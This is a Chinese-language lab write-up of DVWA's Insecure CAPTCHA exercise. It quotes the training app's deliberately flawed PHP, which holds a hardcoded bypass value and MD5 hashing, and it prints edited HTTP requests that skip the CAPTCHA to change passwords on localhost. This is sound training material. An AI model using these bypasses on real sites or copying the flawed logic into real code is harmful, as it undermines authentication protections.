---
layout: post
title: "DVWA Insecure CAPTCHA"
description: ""
date: 2023-07-11
categories:
  - DVWA
  - DVWA_CAPTCHA
author: ""
tags: ['DVWA', 'CAPTCHA']
---



# DVWA Insecure CAPTCHA
###### tags: `DVWA`



<br/><br/>
這題，我沒裝驗證，其實他的目地是抓邏輯漏洞，繞過驗證，所以不裝也沒差。
仔細跟蹤 $_POST[ 'step' ]=1 他會幫我們驗證。，然後自動 post 一個 $_POST[ 'step' ]=2


```php=
 <?php

if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '1' ) ) {
    // Hide the CAPTCHA form
    $hide_form = true;

    // Get input
    $pass_new  = $_POST[ 'password_new' ];
    $pass_conf = $_POST[ 'password_conf' ];

    // Check CAPTCHA from 3rd party
    $resp = recaptcha_check_answer(
        $_DVWA[ 'recaptcha_private_key' ],
        $_POST['g-recaptcha-response']
    );

    // Did the CAPTCHA fail?
    if( !$resp ) {
        // What happens when the CAPTCHA was entered incorrectly
        $html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";
        $hide_form = false;
        return;
    }
    else {
        // CAPTCHA was correct. Do both new passwords match?
        if( $pass_new == $pass_conf ) {
            // Show next stage for the user
            echo "
                <pre><br />You passed the CAPTCHA! Click the button to confirm your changes.<br /></pre>
                <form action=\"#\" method=\"POST\">
                    <input type=\"hidden\" name=\"step\" value=\"2\" />
                    <input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" />
                    <input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" />
                    <input type=\"hidden\" name=\"passed_captcha\" value=\"true\" />
                    <input type=\"submit\" name=\"Change\" value=\"Change\" />
                </form>";
        }
        else {
            // Both new passwords do not match.
            $html     .= "<pre>Both passwords must match.</pre>";
            $hide_form = false;
        }
    }
}

if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) {
    // Hide the CAPTCHA form
    $hide_form = true;

    // Get input
    $pass_new  = $_POST[ 'password_new' ];
    $pass_conf = $_POST[ 'password_conf' ];

    // Check to see if they did stage 1
    if( !$_POST[ 'passed_captcha' ] ) {
        $html     .= "<pre><br />You have not passed the CAPTCHA.</pre>";
        $hide_form = false;
        return;
    }

    // Check to see if both password match
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );

        // Update database
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

        // Feedback for the end user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with the passwords matching
        echo "<pre>Passwords did not match.</pre>";
        $hide_form = false;
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>



```



bp 抓包:
```http=
POST /vulnerabilities/captcha/ HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 77
Origin: http://localhost
Connection: close
Referer: http://localhost/vulnerabilities/captcha/
Cookie: PHPSESSID=2f9c2085585d320a3a85d42a7e1a4566; security=low
Upgrade-Insecure-Requests: 1

step=1&password_new=777&password_conf=777&g-recaptcha-response=&Change=Change

```

step 改2，就可以改密碼了。


<br/><br/>
# Medium 


關鍵code:
passed_captcha = true

```php=
  <pre><br />You passed the CAPTCHA! Click the button to confirm your changes.<br /></pre>
    <form action=\"#\" method=\"POST\">
        <input type=\"hidden\" name=\"step\" value=\"2\" />
        <input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" />
        <input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" />
        <input type=\"hidden\" name=\"passed_captcha\" value=\"true\" />
        <input type=\"submit\" name=\"Change\" value=\"Change\" />
    </form>"; 
```

關於這個code 在實際中怎們拿到，你可以先去google 驗證，然後停下來抓包去看一下post 發生了啥改變。


bp 
```http=
POST /vulnerabilities/captcha/ HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 77
Origin: http://localhost
Connection: close
Referer: http://localhost/vulnerabilities/captcha/
Cookie: PHPSESSID=2f9c2085585d320a3a85d42a7e1a4566; security=medium
Upgrade-Insecure-Requests: 1

step=1&password_new=666&password_conf=666&g-recaptcha-response=&Change=Change
```

然後差不多 step改2 
加上passed_captcha = true


```php=
step=2&password_new=777&password_conf=777&Change=Change&passed_captcha=true
```
成功。




<br/><br/>
# High


```php=
<?php

if( isset( $_POST[ 'Change' ] ) ) {
    // Hide the CAPTCHA form
    $hide_form = true;

    // Get input
    $pass_new  = $_POST[ 'password_new' ];
    $pass_conf = $_POST[ 'password_conf' ];

    // Check CAPTCHA from 3rd party
    $resp = recaptcha_check_answer(
        $_DVWA[ 'recaptcha_private_key' ],
        $_POST['g-recaptcha-response']
    );

    if (
        $resp || 
        (
            $_POST[ 'g-recaptcha-response' ] == 'hidd3n_valu3'
            && $_SERVER[ 'HTTP_USER_AGENT' ] == 'reCAPTCHA'
        )
    ){
        // CAPTCHA was correct. Do both new passwords match?
        if ($pass_new == $pass_conf) {
            $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
            $pass_new = md5( $pass_new );

            // Update database
            $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "' LIMIT 1;";
            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

            // Feedback for user
            echo "<pre>Password Changed.</pre>";

        } else {
            // Ops. Password mismatch
            $html     .= "<pre>Both passwords must match.</pre>";
            $hide_form = false;
        }

    } else {
        // What happens when the CAPTCHA was entered incorrectly
        $html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";
        $hide_form = false;
        return;
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

// Generate Anti-CSRF token
generateSessionToken();

?> 


```


關鍵:
```php=
 if (
        $resp || 
        (
            $_POST[ 'g-recaptcha-response' ] == 'hidd3n_valu3'
            && $_SERVER[ 'HTTP_USER_AGENT' ] == 'reCAPTCHA'
        )
    )
```


抓包:

```http=
POST /vulnerabilities/captcha/ HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 121
Origin: http://localhost
Connection: close
Referer: http://localhost/vulnerabilities/captcha/
Cookie: PHPSESSID=2f9c2085585d320a3a85d42a7e1a4566; security=high
Upgrade-Insecure-Requests: 1

step=1&password_new=666&password_conf=666&g-recaptcha-response=&user_token=47165114b231519eaf29b252ef299a7e&Change=Change

```
<br/>

改兩個地方:
1.User-Agent
2.post數據

改成:
```http=
POST /vulnerabilities/captcha/ HTTP/1.1
Host: localhost
User-Agent: reCAPTCHA
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 121
Origin: http://localhost
Connection: close
Referer: http://localhost/vulnerabilities/captcha/
Cookie: PHPSESSID=2f9c2085585d320a3a85d42a7e1a4566; security=high
Upgrade-Insecure-Requests: 1

step=1&password_new=666&password_conf=666&g-recaptcha-response=hidd3n_valu3&user_token=47165114b231519eaf29b252ef299a7e&Change=Change
```




# Impossible


```php=
 if( !$resp ) {
        // What happens when the CAPTCHA was entered incorrectly
        echo "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";
        $hide_form = false;
    } 
```

沒啥花梨胡紹的，就直接fail 跳轉。


















